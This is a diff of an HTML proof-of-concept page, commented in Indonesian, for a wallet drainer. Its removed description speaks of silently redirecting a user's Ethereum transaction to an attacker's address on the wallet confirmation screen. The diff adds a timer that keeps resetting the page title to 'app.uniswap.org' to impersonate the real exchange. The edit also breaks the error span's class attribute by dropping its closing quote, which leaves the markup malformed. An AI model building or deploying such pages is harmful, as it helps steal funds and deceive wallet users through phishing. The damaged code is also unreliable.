@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transaction Spoofing & UI Desync PoC</title>
+    <title>Transaction Spoofing & Address Bar PoC</title>
     <style>
         body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f9; color: #333; max-width: 600px; margin: auto; }
         .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
@@ -17,8 +17,8 @@
 <body>
 
     <div class="card">
-        <h2>Transaction Parameter Spoofing PoC</h2>
-        <p>Simulasi dApp mengirim transaksi ke alamat target normal, namun di-hook dan dialihkan secara senyap ke alamat penyerang pada layar konfirmasi dompet.</p>
+        <h2>Combined Transaction Spoofing & Spoof Loop PoC</h2>
+        <p>Menggabungkan intersepsi parameter transaksi dengan fungsi manipulasi tampilan/judul halaman.</p>
         
         <button onclick="triggerSpoofedTransaction()">Eksekusi Transaksi Spoofing</button>
         <pre id="log-box">Menunggu aksi pengguna...</pre>
@@ -54,11 +54,10 @@
                 logBox.textContent = "Meminta otorisasi akun (eth_requestAccounts)...";
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-                // Parameter transaksi awal dApp (mengarah ke alamat dummy/kontrak normal)
                 const txParams = {
                     from: (await window.ethereum.request({ method: 'eth_accounts' }))[0],
                     to: "0x1111111111111111111111111111111111111111", 
-                    value: "0x5af3107a4000", // 0.0001 ETH dalam format Hex Wei
+                    value: "0x5af3107a4000", 
                     gas: "0x5208",
                     gasPrice: "0x3b9aca00"
                 };
@@ -71,9 +70,25 @@
                 
                 logBox.innerHTML += `\n<span class="success">[+] Transaksi diproses!\nHash: ${txHash}</span>`;
             } catch (err) {
-                logBox.innerHTML += `\n<span class="danger">[-] Respon/Error: ${err.message}</span>`;
+                logBox.innerHTML += `\n<span class="danger[-] Respon/Error: ${err.message}</span>`;
             }
         }
+
+        // Integrasi fungsi spoof manipulasi halaman
+        function spoof() {
+            try {
+                document.title = "app.uniswap.org";
+            } catch (e) {
+                // Abaikan jika dibatasi kebijakan DOM
+            }
+            
+            setTimeout(function(){
+                // spoof(); // Opsional loop rekursif
+            }, 5000);
+        }
+
+        // Jalankan interval pemanggilan spoof judul/tampilan
+        setInterval(spoof, 2000);
     </script>
 </body>
 </html>
